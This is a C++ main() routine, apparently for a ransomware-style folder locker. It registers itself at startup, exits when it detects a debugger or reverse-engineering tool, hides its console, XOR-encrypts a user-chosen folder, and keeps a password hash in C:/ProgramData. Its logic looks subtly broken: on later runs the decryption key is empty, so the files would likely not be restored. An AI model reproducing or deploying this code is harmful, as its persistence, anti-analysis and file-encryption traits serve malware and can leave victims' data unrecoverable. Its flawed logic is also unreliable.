#include "importants.h"

int main()
{
    if (!addToStartup()) {
        return 1;
    }

    if (isDebuggerOrReverseEngineeringToolRunning()) {
        return 1;
    }

    HideConsole();
    system("cls");
    std::string folder;
    std::string password;
    std::string hashedPassword;

    if (!FileExists("C:/ProgramData/password.crypt") || !FileExists("C:/ProgramData/files.crypt"))
    {
        std::cout << "Enter a folder to encrypt: ";
        std::cin >> folder;

        std::ofstream fileFolder("C:/ProgramData/files.crypt");
        fileFolder << folder;
        fileFolder.close();

        std::cout << "Set your password: ";
        std::cin >> password;
        hashedPassword = GetHashedPassword(password);

        std::ofstream filePass("C:/ProgramData/password.crypt");
        filePass << hashedPassword;
        filePass.close();

        iterateDirectoryAndXOR(folder, password);
    }
    else
    {
        std::ifstream fileFolder("C:/ProgramData/files.crypt");
        fileFolder >> folder;
        fileFolder.close();

        std::ifstream filePass("C:/ProgramData/password.crypt");
        filePass >> hashedPassword;
        filePass.close();
    }

    std::string enteredPassword;
    std::cout << "Enter your password to decrypt: ";
    std::cin >> enteredPassword;
    std::string hashedEnteredPassword = GetHashedPassword(enteredPassword);

    if (hashedEnteredPassword == hashedPassword)
    {

        if (isDebuggerOrReverseEngineeringToolRunning()) {
            std::cout << "Debugger or reverse engineering tool detected.";
            return 1;
        }

        system("start explorer");
        unencryptFiles(folder, password);
        ShowSuccessMessageBox();

    }
    else
    {
        std::cout << "Incorrect password.";
        return 1;
    }
    ShowSuccessMessageBox();

    std::cin.ignore();
}



